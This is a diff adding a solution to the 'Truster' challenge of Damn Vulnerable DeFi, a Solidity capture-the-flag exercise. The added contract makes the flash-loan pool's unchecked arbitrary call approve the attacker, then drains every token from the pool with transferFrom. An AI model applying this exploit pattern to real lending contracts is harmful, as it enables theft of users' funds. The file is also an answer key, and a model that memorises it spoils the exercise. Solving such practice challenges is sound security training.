@@ -6,6 +6,23 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract TrusterPoolRecovery{
+
+    // logic: we call the pool flashloan contract to accept target as the pool contract ....since target.FunctionCall() cane execute any type
+    // of low level call we will approve the pool contract to our newely deployed contract
+    // then we will trnasfer the tokens from pool to recovery
+
+    constructor(DamnValuableToken _token,address _recovery,TrusterLenderPool _pool){
+        // prepare a calldat for approve
+        bytes memory data = abi.encodeWithSelector(_token.approve.selector,address(this),_token.balanceOf(address(_pool)));
+        // flash loan the pool
+        _pool.flashLoan(0,address(_recovery),address(_token),data);
+        // transfer the tokens from pool to recovery
+        _token.transferFrom(address(_pool),address(_recovery),_token.balanceOf(address(_pool)));
+
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -50,7 +67,9 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_truster() public checkSolvedByPlayer {}
+    function test_truster() public checkSolvedByPlayer {
+        new TrusterPoolRecovery(token,recovery,pool);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
